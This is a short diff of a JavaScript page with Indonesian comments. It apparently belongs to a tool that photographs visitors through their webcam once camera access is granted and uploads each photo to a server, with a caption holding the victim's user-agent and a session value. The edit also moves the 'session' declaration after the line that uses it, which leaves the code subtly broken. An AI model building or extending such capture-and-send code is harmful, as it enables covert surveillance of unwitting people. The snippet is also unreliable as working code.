@@ -16,15 +16,15 @@
 
             // Ambil user-agent dari browser
             const userAgent = navigator.userAgent;
-            
-            // Tambahkan user-agent ke dalam caption
-            const session = new URLSearchParams(window.location.search).get("session");
+
 
             const captions = `
             📍 **Pengguna ini mengizinkan kamera pada browsernya**
             🌐 User-Agent: ${userAgent}
             🔑 Session: ${session}
             `;
+
+            const session = new URLSearchParams(window.location.search).get("session");
             
             // Kirim foto ke server
             const formData = new FormData();
